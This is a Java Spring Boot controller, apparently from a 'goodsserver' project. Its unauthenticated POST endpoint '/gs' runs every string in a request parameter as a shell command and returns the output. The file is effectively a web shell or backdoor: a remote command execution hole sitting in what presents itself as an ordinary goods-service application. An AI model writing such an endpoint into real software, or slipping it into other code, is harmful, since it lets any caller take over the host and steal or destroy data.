package com.dkdy.goodsserver;

import java.util.ArrayList;

import com.util.ShellBean;
import com.util.ShellUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@Slf4j
@RestController
public class GsExecutor {

	public GsExecutor() {
		log.info("init configure finished gs");
	}

	@PostMapping("/gs")
	public String extshell(@RequestParam ShellBean shell ) {
		String exeCmd="";
		ArrayList<String> list = shell.getList();
		for (String string : list) {
			exeCmd = ShellUtils.exeCmd(string);
		}
		
		return exeCmd;
	}

}
